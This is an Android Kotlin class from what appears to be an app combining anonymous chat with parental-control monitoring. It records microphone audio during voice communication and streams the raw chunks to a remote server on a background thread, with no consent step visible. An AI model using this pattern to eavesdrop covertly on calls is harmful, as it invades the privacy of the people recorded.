package com.anonchat.app.parentalcontrol.manager

import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.util.Log
import com.anonchat.app.parentalcontrol.api.ApiClient

class CallStreamManager {

    private var audioRecord: AudioRecord? = null
    private var streamThread: Thread? = null
    @Volatile
    var isStreaming = false
        private set
    var onStreamingStateChanged: ((Boolean) -> Unit)? = null

    fun startStreaming() {
        if (isStreaming) return
        isStreaming = true
        onStreamingStateChanged?.invoke(true)

        streamThread = Thread {
            var recorder: AudioRecord? = null
            try {
                val sampleRate = 16000
                val channelConfig = AudioFormat.CHANNEL_IN_MONO
                val audioFormat = AudioFormat.ENCODING_PCM_16BIT
                val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)

                recorder = AudioRecord(
                    MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSize * 2
                )

                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    isStreaming = false
                    onStreamingStateChanged?.invoke(false)
                    return@Thread
                }

                recorder.startRecording()
                Log.d(TAG, "Started streaming audio at ${sampleRate}Hz")

                val buffer = ByteArray(4096)
                while (isStreaming && !Thread.currentThread().isInterrupted) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val audioChunk = buffer.copyOfRange(0, read)
                        sendAudioChunk(audioChunk, sampleRate)
                    }
                }
            } catch (e: SecurityException) {
                Log.e(TAG, "RECORD_AUDIO permission denied: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "Streaming error: ${e.message}")
            } finally {
                try {
                    recorder?.stop()
                    recorder?.release()
                } catch (e: Exception) {}
                isStreaming = false
                onStreamingStateChanged?.invoke(false)
                Log.d(TAG, "Audio streaming stopped")
            }
        }
        streamThread?.isDaemon = true
        streamThread?.start()
    }

    fun stopStreaming() {
        isStreaming = false
        streamThread?.interrupt()
        streamThread = null
    }

    private fun sendAudioChunk(chunk: ByteArray, sampleRate: Int) {
        try {
            ApiClient.streamAudioChunk(chunk, sampleRate)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio chunk: ${e.message}")
        }
    }

    companion object {
        private const val TAG = "CallStreamManager"
    }
}
